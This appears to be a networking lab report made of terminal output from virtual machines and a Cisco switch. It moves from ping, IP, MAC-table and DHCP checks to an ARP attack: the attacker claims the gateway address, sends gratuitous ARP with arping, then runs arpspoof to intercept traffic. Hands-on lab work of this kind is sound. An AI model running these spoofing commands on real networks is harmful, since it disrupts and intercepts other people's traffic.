```
[rocky@localhost ~]$ ping -I enp0s3 youtube.com
PING youtube.com (142.250.74.238) from 192.168.122.48 enp0s3: 56(84) bytes of data.
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=1 ttl=115 time=25.4 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=2 ttl=115 time=31.5 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=3 ttl=115 time=30.0 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=4 ttl=115 time=29.3 ms

--- youtube.com ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 25.434/29.055/31.491/2.233 ms
```

```
[rocky@localhost ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever

2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:1d:92:73 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.48/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 3202sec preferred_lft 3202sec
    inet6 fe80::a00:27ff:fe1d:9273/64 scope link 
       valid_lft forever preferred_lft forever
```

```
node1.tp2> ping 10.2.1.254
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=2.675 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=1.850 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=2.757 ms
```

```
node1.tp2> ping 1.1.1.1
84 bytes from 1.1.1.1 icmp_seq=1 ttl=57 time=44.826 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=57 time=34.547 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=57 time=39.536 ms
```

```
IOU1#show mac address-table
Mac Address Table
--------------------------------------------------
Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/0
   1    0800.27a1.558f    DYNAMIC     Et1/0
Total Mac Addresses for this criterion: 2
```

```
node1.tp2> dhcp
DDORA IP 10.2.1.200/24 GW 10.2.1.254

node1.tp2> show
NAME    IP/MASK         GATEWAY
node1.t10.2.1.200/24    10.2.1.254
```

```
[rocky@router ~]$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.2.1.253       0x1         0x2         08:00:27:3d:51:71     *        enp0s8
192.168.56.1     0x1         0x2         0a:00:27:00:00:0f     *        enp0s9
10.2.1.1         0x1         0x2         00:50:79:66:68:00     *        enp0s8
192.168.56.100   0x1         0x2         08:00:27:cf:d5:bf     *        enp0s9
```

```
sudo ip addr add 10.2.1.254/24 dev enp0s3
```

```
arping -U -I enp0s3 -s 10.2.1.254 10.2.1.30
```

```
node1.tp2> ping 1.1.1.1
1.1.1.1 icmp_seq=1 timeout
1.1.1.1 icmp_seq=2 timeout
1.1.1.1 icmp_seq=3 timeout
```

```
sudo ip addr del 10.2.1.254/24 dev enp0s3
```

```
[root@localhost rocky]# cat /proc/sys/net/ipv4/ip_forward
1
```

```
[root@localhost rocky]# arpspoof -i enp0s3 -r -t 10.2.1.30 10.2.1.254
8:0:27:3a:d9:95 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at 8:0:27:3a:d9:95
8:0:27:3a:d9:95 8:0:27:a1:55:8f 0806 42: arp reply 10.2.1.30 is-at 8:0:27:3a:d9:95
```
